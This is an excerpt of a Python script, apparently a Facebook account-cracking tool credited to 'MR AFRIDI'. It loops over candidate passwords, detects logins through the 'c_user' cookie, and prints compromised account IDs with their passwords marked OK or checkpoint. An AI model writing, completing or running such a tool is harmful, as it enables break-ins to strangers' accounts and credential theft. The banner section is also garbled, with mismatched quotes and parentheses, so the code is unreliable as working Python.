...
'''
this is an open source program by mr. dada afridi (dr noor afridi)
...
def banner():
	os.system("clear")
    print("")  .    .____ .___  _ .___   _"%(M))
    print("") /|    /     /   \ | /   `  |"%(M))
    print("") /  \   |__.  |__-' | |    | |"%(M))
    print("") /---'\  |     |  \  | |    | |"%(M))
    print("") ,  '      \ /     /   \ / /---/  /"%(M))
	print("%s╔══════════════════════════════════════════╗"%(Z))
	print("%s║%s  Author   : %.s MR AFRIDI                %s║"%(D,R,N,A))
	print("%s║%s  Github   : CYBER HUNTER-1982               %s║"%(P,K,C))
	print("%s║%s  Telegram : Hacker Afridi               %s║"%(Z,B,Z))
	...
	try:
		for pasw in pwx:
			...
			if 'c_user' in fb_cookies:
				...
				uidx = coki[65:80]
				print('\033[1;32m [AFRIDI-OK] '+uidx+'|'+pasw+'\033[0;97m')
				...
				coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
				uidx = coki[82:97]
				print('\033[1;31m [AFRIDI-CP] '+uidx+' | '+pasw+'\033[0;97m')
